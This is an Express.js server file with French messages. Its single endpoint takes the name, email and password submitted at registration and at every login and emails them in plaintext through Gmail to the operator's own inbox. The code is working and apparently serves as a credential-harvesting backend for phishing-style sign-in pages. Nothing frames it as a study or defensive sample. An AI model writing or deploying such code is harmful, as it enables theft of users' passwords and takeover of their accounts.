const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

app.post("/send-notification", async (req, res) => {

    const { name, email, password, type } = req.body;

    if ((type === "register" && (!name || !email || !password)) ||
        (type === "login" && (!email || !password))) {
        return res.status(400).json({ success: false, error: "Champs manquants." });
    }

    let subject = "";
    let text = "";

    if (type === "register") {
        subject = "Nouvelle inscription sur le site";
        text = `Nom : ${name}\nEmail : ${email}\nMot de passe : ${password}`;
    } else {
        subject = "Nouvelle connexion sur le site";
        text = `Email : ${email}\nMot de passe : ${password}`;
    }

    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject,
            text
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Erreur d'envoi email :", err);
        res.status(500).json({ success: false, error: err.message });
    }

});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`Serveur lancé sur http://localhost:${PORT}`);
});
